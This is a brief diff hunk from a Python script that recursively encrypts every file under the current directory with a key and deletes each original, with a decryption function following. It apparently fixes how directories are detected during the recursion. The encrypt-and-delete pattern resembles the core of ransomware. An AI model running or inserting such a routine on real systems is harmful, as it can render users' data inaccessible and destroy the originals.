@@ -61,7 +61,7 @@ def sup_enc(key, dir):
 		if fileordir(os.getcwd(),i) == 1:
 			encrypt(key,i)
 			del_file(os.getcwd(),i)
-		else:
+		elif fileordir(os.getcwd(),i) == 0:
 			sup_enc(key, i)
 	
 def dec_all():
